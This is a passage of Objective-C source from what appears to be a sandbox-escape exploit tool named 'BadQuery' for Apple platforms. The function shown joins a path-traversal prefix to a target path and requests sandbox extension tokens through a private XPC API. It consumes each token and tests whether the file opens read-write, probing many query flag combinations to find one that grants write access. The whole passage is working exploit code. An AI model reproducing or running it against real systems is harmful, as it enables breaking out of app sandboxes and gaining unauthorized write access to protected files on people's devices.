    { 0x0000000800000000ULL | 0x0000001000000000ULL, "group+bit36" },
    { 0x0000000800000000ULL | 0x0000010000000000ULL, "group+bit40" },
    // Lower 32-bit flags (uncommon but worth probing)
    { 0x0000000000000001ULL, "bit-0" },
    { 0x0000000000000002ULL, "bit-1" },
    { 0x0000000000000004ULL, "bit-2" },
    { 0x0000000000000008ULL, "bit-3" },
    { 0x0000000000000010ULL, "bit-4" },
    { 0x0000000000000100ULL, "bit-8" },
    { 0x0000000000001000ULL, "bit-12" },
    { 0x0000000000010000ULL, "bit-16" },
    { 0x0000000001000000ULL, "bit-24" },
    // No flags
    { 0ULL, "no-flags" },
};

void BadQueryProbeFlags(NSString *targetPath)
{
    if (!targetPath || !BadQueryBridgeAvailable()) {
        GKTLLogObjC(@"BadQueryProbeFlags: bridge unavailable or path nil");
        return;
    }

    BadQueryAPI *api = BadQuerySharedAPI();

    // Normalize path: strip /private prefix
    NSString *queryPath = targetPath;
    if ([queryPath hasPrefix:@"/private/"]) {
        queryPath = [queryPath substringFromIndex:8];
    }

    // lstat pre-check
    struct stat st;
    const char *pathC = [targetPath fileSystemRepresentation];
    if (!pathC || lstat(pathC, &st) != 0) {
        GKTLLogObjC(@"BadQueryProbeFlags: lstat failed for %@", targetPath);
        return;
    }

    NSString *partDomain = [kBadQueryTraversalPrefix stringByAppendingString:queryPath];
    const char *partDomainC = [partDomain fileSystemRepresentation];
    if (!partDomainC) {
        GKTLLogObjC(@"BadQueryProbeFlags: partDomain encoding failed");
        return;
    }

    GKTLLogObjC(@"=== BadQueryProbeFlags START for %@ ===", targetPath);
    GKTLLogObjC(@"Probing %zu flag combinations...", sizeof(kFlagProbes)/sizeof(kFlagProbes[0]));

    static const int kProbeCount = (int)(sizeof(kFlagProbes) / sizeof(kFlagProbes[0]));
    for (int i = 0; i < kProbeCount; i++) {
        uint64_t flags = kFlagProbes[i].flags;
        const char *label = kFlagProbes[i].label;

        void *query = api->create();
        if (!query) {
            GKTLLogObjC(@"probe[%d] %s (0x%016llx): create() FAILED", i, label, (unsigned long long)flags);
            continue;
        }

        api->setClass(query, kBadQueryContainerClass);
        xpc_object_t identifier = xpc_string_create(kBadQueryIdentifier.UTF8String);
        api->setGroupIdentifiers(query, identifier);
        #if !__has_feature(objc_arc)
        xpc_release(identifier);
        #endif
        api->setPart(query, kBadQueryPart);
        api->setPartDomain(query, partDomainC);
        api->setFlags(query, flags);

        __block void *result = NULL;
        __block BOOL completed = NO;
        dispatch_semaphore_t sema = dispatch_semaphore_create(0);
        dispatch_queue_t q = dispatch_queue_create("com.wesk.vtool.probe", DISPATCH_QUEUE_SERIAL);
        dispatch_async(q, ^{
            result = api->getSingleResult(query);
            completed = YES;
            dispatch_semaphore_signal(sema);
        });
        dispatch_time_t to = dispatch_time(DISPATCH_TIME_NOW, 3 * NSEC_PER_SEC);
        dispatch_semaphore_wait(sema, to);

        if (!completed) {
            GKTLLogObjC(@"probe[%d] %s (0x%016llx): XPC TIMEOUT", i, label, (unsigned long long)flags);
            // leak query (thread may still reference it)
            continue;
        }

        if (!result) {
            api->freeQuery(query);
            GKTLLogObjC(@"probe[%d] %s (0x%016llx): getSingleResult NULL", i, label, (unsigned long long)flags);
            continue;
        }

        char *token = api->copySandboxToken(result);
        if (!token) {
            api->freeQuery(query);
            GKTLLogObjC(@"probe[%d] %s (0x%016llx): token NULL", i, label, (unsigned long long)flags);
            continue;
        }

        int64_t handle = api->consumeSandboxExtension(token);
        free(token);
        api->freeQuery(query);

        if (handle < 0) {
            GKTLLogObjC(@"probe[%d] %s (0x%016llx): consume FAILED (handle=%lld)", i, label, (unsigned long long)flags, (long long)handle);
            continue;
        }

        // We have a valid handle. Test if it grants read-write by opening O_RDWR.
        int fd = open(pathC, O_RDWR | O_CLOEXEC | O_NOFOLLOW);
        int openErrno = errno;
        BOOL canWrite = NO;
        if (fd >= 0) {
            canWrite = YES;
            close(fd);
        }

        GKTLLogObjC(@"probe[%d] %s (0x%016llx): handle=%lld canWrite=%d (open errno=%d: %s)",
              i, label, (unsigned long long)flags, (long long)handle, canWrite, openErrno, strerror(openErrno));

        // Release the extension
        api->releaseSandboxExtension(handle);
    }

    GKTLLogObjC(@"=== BadQueryProbeFlags END ===");
}
